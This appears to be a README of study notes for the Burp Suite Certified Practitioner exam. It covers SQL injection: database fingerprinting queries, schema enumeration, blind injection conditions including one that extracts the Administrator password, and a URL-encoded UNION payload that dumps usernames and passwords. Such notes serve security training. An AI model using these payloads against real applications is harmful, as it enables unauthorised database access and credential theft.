# Notes-Burp-Suite-Certification-Practitioner-BSCP-
Notes for the Burp Suite Certification

# SQL Injection 

### Determining the number of columns required


### Finding columns with a useful data type


### Using a SQL injection UNION attack to retrieve interesting data



### String concatenation

You can concatenate together multiple strings to make a single string.
```
Oracle	'foo'||'bar'
Microsoft	'foo'+'bar'
PostgreSQL	'foo'||'bar'
MySQL	'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')
```
### Querying the database type and version

```
Database type	Query
Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()
```

### Listing the contents of the database
to list the tables in the database: ```SELECT table_name FROM information_schema.tables```

to list the columns in individual tables:: ```SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'```

to list the database names: ```SELECT schema_name FROM information_schema.schemata ``` 


### Blind SQL injection
```
…xyz' AND '1'='1
…xyz' AND '1'='2

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

```


Pets%20%27%20union%20select%20null,%20username_igiesp%20||%20%27-%27%20||%20%20password_hpvetj%20from%20users_pvuawd--%20-

# Interesting Resources 

https://deephacking.tech/burp-suite-certified-practicioner-review-bscp/
https://portswigger.net/web-security/certification/how-to-prepare
https://portswigger.net/research/articles
https://www.youtube.com/@PortSwiggerTV/playlists

# Live Practices
https://www.youtube.com/watch?v=yC0F05oggTE
https://www.youtube.com/watch?v=dGsCA1N1BK0
